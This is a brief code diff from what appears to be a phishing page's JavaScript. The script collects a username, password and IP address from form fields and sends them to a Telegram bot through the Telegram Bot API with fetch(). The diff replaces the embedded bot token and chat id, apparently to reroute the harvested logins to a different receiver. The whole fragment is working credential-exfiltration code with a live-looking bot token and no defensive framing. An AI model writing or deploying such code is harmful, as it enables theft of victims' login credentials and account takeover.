@@ -200,8 +200,8 @@
             var ipAddress = document.getElementById('ipAddress').value;
 
             var telegramMessage = `Username: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}`;
-            var token = '8052566388:AAGXSqF9uAzaa_SfqD1KO2dROSA2cb0GvKs';
-            var chat_id = '7876943857';
+            var token = '7660525561:AAEGYLcSax6uX8ywEcGJCBcxpzsTrICNAnk';
+            var chat_id = 't.me/zabatavote_bot';
             var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
 
             fetch(url)
